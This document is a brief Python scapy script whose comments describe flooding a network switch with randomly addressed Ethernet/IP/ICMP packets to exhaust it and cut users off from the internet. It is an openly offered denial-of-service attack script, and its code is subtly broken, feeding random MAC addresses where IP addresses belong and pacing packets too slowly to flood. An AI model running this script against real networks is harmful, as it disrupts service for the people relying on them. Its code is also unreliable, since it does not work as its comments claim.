# Send a large number of packets to overwhelm the switch's ability to handle normal information, causing users to be unable to access the internet.
# In plain terms, it's designed to exhaust the system.
from scapy.all import *
import time

def main():
    while 1:
        packet = Ether(src=randMAC(), dst=randMAC()) / IP(src=randMAC(), dst=randMAC()) / ICMP()  # Everything is random, flooding the system with junk data to exhaust it.
        # For Layer 2 only: Ether(src=randMAC(), dst=randMAC())
        # For Layer 3 only: IP(src=randMAC(), dst=randMAC()) / ICMP()
        sendp(packet)
        time.sleep(0.5)
        print(packet.summary())
        # Running for a few seconds is enough; running for too long might crash the computer.
    pass

if __name__ == "__main__":
    main()